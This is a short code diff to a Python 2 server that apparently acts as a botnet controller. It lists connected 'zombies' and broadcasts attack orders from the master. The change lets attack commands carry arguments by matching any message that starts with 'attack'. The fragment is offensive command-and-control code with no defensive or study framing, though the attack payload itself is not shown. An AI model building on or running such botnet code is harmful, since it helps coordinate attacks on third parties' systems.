@@ -104,7 +104,7 @@ class BasicChatServer(SocketServer):
             list = self.listzombies()
             client.send(list)
         #Sending attack message to zombies
-        elif data == "attack":
+        elif data.startswith("attack"):
             print "Master sent attack order"
             self.broadcast(message)
             client.send("Attack mode activated\n")
